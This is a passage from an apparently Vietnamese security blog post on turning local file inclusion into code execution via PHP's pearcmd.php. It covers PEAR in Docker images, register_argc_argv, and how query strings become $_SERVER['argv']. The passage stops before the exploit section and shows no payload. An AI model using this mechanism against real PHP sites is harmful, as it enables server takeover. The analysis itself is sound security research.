<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php"><meta name="keywords" content='analyst, lfi, plugin, pearcmd'>
  <meta itemprop="name" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
  <meta itemprop="description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
  <meta itemprop="datePublished" content="2025-10-22T20:48:00+07:00">
  <meta itemprop="dateModified" content="2025-10-22T20:48:00+07:00">
  <meta itemprop="wordCount" content="2985">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
  <meta itemprop="keywords" content="Analyst,Lfi,Plugin,Pearcmd"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
  <meta property="og:description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-22T20:48:00+07:00">
    <meta property="article:modified_time" content="2025-10-22T20:48:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Lfi">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Pearcmd">
    <meta property="og:image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
  <meta name="twitter:title" content="Exploiting LFI2RCE Vulnerability via PHP PEARCMD">
  <meta name="twitter:description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-10-22-cve-2025-11361/" title="CVE-2025-11361 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-10-23-cve-2023-36679/" title="CVE-2023-36679 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Exploiting LFI2RCE Vulnerability via PHP PEARCMD",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, lfi, plugin, pearcmd","wordcount":  2985 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/","datePublished": "2025-10-22T20:48:00+07:00","dateModified": "2025-10-22T20:48:00+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php"
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/">English</option><option value="/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-18-cve-2025-26909/" title="CVE-2025-26909 Analysis &amp; POC">CVE-2025-26909 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-10-22 20:48:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-22">2025-10-22</time></span>&nbsp;<span title="2985 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 3000 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>15 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png' alt="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pear-và-pecl-là-gì">PEAR và PECL là gì?</a></li>
    <li><a href="#pearcmdphp-và-register_argc_argv"><code>pearcmd.php</code> và <code>register_argc_argv</code></a></li>
    <li><a href="#analysis-php-source-code">Analysis PHP Source Code</a></li>
    <li><a href="#rfc3875-explain">RFC3875 Explain</a></li>
    <li><a href="#testing-pear-in-cli">Testing PEAR in CLI</a></li>
    <li><a href="#pearcmd-code-analysis"><code>pearcmd</code> Code Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#exploit">Exploit</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>Xin chào. Sau khi phân tích 10 CVE liên quan đến LFI trên các plugin WordPress, tôi nhận thấy một rào cản chung: nhiều vector khai thác bị giới hạn bởi yêu cầu <strong>phải có hậu tố <code>.php</code></strong>. Điều này làm giảm đáng kể khả năng khai thác. Trong quá trình tìm hiểu, tôi tìm thấy bài viết <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"target="_blank" rel="external nofollow noopener noreferrer">docker-php-include-getshell</a>. Bài đó mô tả cách <strong>bypass ràng buộc <code>.php</code></strong> bằng cách lợi dụng file <code>pearcmd.php</code> vốn nằm trong bộ công cụ <strong>PECL</strong>/<strong>PEAR</strong> của PHP và có sẵn trong môi trường WordPress được triển khai trên Docker - một mẹo rất thực tế cho kịch bản không cho upload file.</p>
<h2 class="heading-element" id="pear-và-pecl-là-gì"><span>PEAR và PECL là gì?</span>
  <a href="#pear-v%c3%a0-pecl-l%c3%a0-g%c3%ac" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>PECL (PHP Extension Community Library)</strong>: công cụ dòng lệnh để cài và quản lý extension PHP.</li>
<li><strong>PEAR (PHP Extension and Application Repository)</strong>: thư viện nền tảng cho PECL.</li>
</ul>
<p>Trước PHP <code>7.3</code>, PEAR/PECL thường được cài mặc định.<br>
Từ PHP <code>7.4</code> trở đi, cần biên dịch PHP với <code>--with-pear</code> để có chúng.</p>
<p>Tuy nhiên, trong các Docker image PHP chính thức, PEAR/PECL <strong>vẫn thường được cài sẵn</strong>, nằm ở <code>/usr/local/lib/php</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# ls /usr/local/lib/php
</span></span><span class="line"><span class="cl">Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test</span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="pearcmdphp-và-register_argc_argv"><span><code>pearcmd.php</code> và <code>register_argc_argv</code></span>
  <a href="#pearcmdphp-v%c3%a0-register_argc_argv" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>pearcmd.php</code> là một script PHP thiết kế để chạy ở chế độ dòng lệnh, ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php /usr/local/lib/php/pearcmd.php install somepackage</span></span></code></pre></td></tr></table>
</div>
</div><p>Nó xử lý các tham số từ <code>$argv</code> và <code>$argc</code>. Khi chạy như CLI thì dữ liệu này rõ ràng. Nếu file này được include trong bối cảnh web (do LFI), logic CLI của nó có thể bị lợi dụng.</p>
<p>Điểm then chốt là cấu hình <code>register_argc_argv</code>. Nếu <code>register_argc_argv = On</code>, PHP sẽ tạo:</p>
<ul>
<li><code>$argc</code></li>
<li><code>$argv</code></li>
<li><code>$_SERVER['argv']</code></li>
</ul>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" title="`argv` trong cấu hình PHP" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" data-sub-html="<h2>argv</h2><p>`argv` trong cấu hình PHP</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png' alt="argv" height="190" width="844"></a><figcaption class="image-caption">`argv` trong cấu hình PHP</figcaption>
  </figure></p>
<p>Khi thiết lập WordPress trên Docker, <code>register_argc_argv</code> thường bật mặc định. Vấn đề đặt ra: khi PHP chạy dưới SAPI web (FPM/Apache) và không phải CLI, <code>$argv</code> lấy dữ liệu từ đâu?</p>
<h2 class="heading-element" id="analysis-php-source-code"><span>Analysis PHP Source Code</span>
  <a href="#analysis-php-source-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Trong PHP core có logic như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">PG</span><span class="p">(</span><span class="n">register_argc_argv</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">php_build_argv</span><span class="p">(</span><span class="nf">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">query_string</span><span class="p">,</span> <span class="o">&amp;</span><span class="nf">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu không có <code>argc</code> (không chạy CLI), PHP gọi <code>php_build_argv</code> với <code>SG(request_info).query_string</code> - tức <strong>query string</strong> của URL. Ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/index.php?a=b&amp;c=d</span></span></code></pre></td></tr></table>
</div>
</div><p>→ <code>query_string = &quot;a=b&amp;c=d&quot;</code></p>
<p>PHP sẽ dùng query string này để tạo biến <code>argv</code>, do đó <code>$_SERVER['argv']</code> có thể bị ảnh hưởng bởi query string.</p>
<p><strong>Hậu quả</strong>:</p>
<p>Khi <code>pearcmd.php</code> được include qua LFI trong môi trường web mà <code>$_SERVER['argv']</code> được sinh từ query string, attacker có thể điều khiển các tham số dòng lệnh mà <code>pearcmd.php</code> đọc được. Do đó, chức năng dòng lệnh của PEAR/PECL có thể bị lợi dụng qua web để thực hiện hành động không mong muốn.</p>
<h2 class="heading-element" id="rfc3875-explain"><span>RFC3875 Explain</span>
  <a href="#rfc3875-explain" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>RFC3875 (CGI spec) định nghĩa một dạng <strong>&ldquo;indexed&rdquo; HTTP query</strong> - tức là chuỗi truy vấn không chứa dấu <code>=</code> chưa mã hóa và được gửi qua phương thức GET hoặc HEAD.</p>
<p>Khi gặp loại truy vấn này, server <strong>nên</strong> (<code>SHOULD</code>) coi phần query-string như một <strong>search-string</strong>, tách thành các <strong>search-word</strong> bằng dấu <code>+</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search-string = search-word ( &#34;+&#34; search-word )
</span></span><span class="line"><span class="cl">search-word = 1*schar</span></span></code></pre></td></tr></table>
</div>
</div><p>Sau khi tách, mỗi <code>search-word</code> sẽ được <strong>URL-decode</strong>, có thể mã hóa lại theo hệ thống, rồi <strong>thêm vào danh sách đối số dòng lệnh (<code>argv</code>)</strong> của chương trình CGI.</p>
<p>Nói ngắn gọn: nếu query-string không có dấu <code>=</code> và là yêu cầu GET hoặc HEAD, máy chủ có thể coi các phần ngăn cách bằng <code>+</code> như các tham số dòng lệnh và truyền vào <code>argv</code>.</p>
<p><strong>RFC3875</strong> cho phép server biến một query-string &ldquo;indexed&rdquo; (GET/HEAD, không có ký tự <code>=</code> chưa mã hóa) thành danh sách từ, rồi đưa vào <code>argv</code>. Phần mô tả trong tiêu chuẩn như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4.4. The Script Command Line
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Some systems support a method for supplying an array of strings to
</span></span><span class="line"><span class="cl">the CGI script. This is only used in the case of an &#39;indexed&#39; HTTP
</span></span><span class="line"><span class="cl">query, which is identified by a &#39;GET&#39; or &#39;HEAD&#39; request with a URI
</span></span><span class="line"><span class="cl">query string that does not contain any unencoded &#34;=&#34; characters. For
</span></span><span class="line"><span class="cl">such a request, the server SHOULD treat the query-string as a
</span></span><span class="line"><span class="cl">search-string and parse it into words, using the rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">search-string = search-word ( &#34;+&#34; search-word )
</span></span><span class="line"><span class="cl">search-word = 1*schar
</span></span><span class="line"><span class="cl">schar = unreserved | escaped | xreserved
</span></span><span class="line"><span class="cl">xreserved = &#34;;&#34; | &#34;/&#34; | &#34;?&#34; | &#34;:&#34; | &#34;@&#34; | &#34;&amp;&#34; | &#34;=&#34; | &#34;,&#34; |
</span></span><span class="line"><span class="cl">&#34;$&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">After parsing, each search-word is URL-decoded, optionally encoded in
</span></span><span class="line"><span class="cl">a system-defined manner and then added to the command line argument
</span></span><span class="line"><span class="cl">list.</span></span></code></pre></td></tr></table>
</div>
</div><p>PHP từng có lỗ hổng liên quan (<a href="https://nvd.nist.gov/vuln/detail/cve-2012-1823"target="_blank" rel="external nofollow noopener noreferrer">CVE-2012-1823</a>). Hiện nay, PHP xử lý query-string rộng hơn RFC - ngay cả khi query-string có dấu <code>=</code>, nó vẫn có thể được đưa vào <code>$_SERVER['argv']</code>.</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" title="PHP vẫn thêm query-string có dấu `=` vào $_SERVER[&#39;argv&#39;]" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" data-sub-html="<h2>equal</h2><p>PHP vẫn thêm query-string có dấu `=` vào $_SERVER[&#39;argv&#39;]</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png' alt="equal" height="276" width="1058"></a><figcaption class="image-caption">PHP vẫn thêm query-string có dấu `=` vào $_SERVER['argv']</figcaption>
  </figure></p>
<p>👉 Khi truyền query string theo dạng <code>?a+b+c+...</code>, PHP sẽ tách chuỗi tại các dấu <code>+</code> và tạo ra biến <code>$_SERVER['argv']</code> dưới dạng một mảng chứa các phần tử <code>['a', 'b', 'c', ...]</code>, đúng theo cơ chế được mô tả trong RFC3875.</p>
<h2 class="heading-element" id="testing-pear-in-cli"><span>Testing PEAR in CLI</span>
  <a href="#testing-pear-in-cli" class="heading-mark">
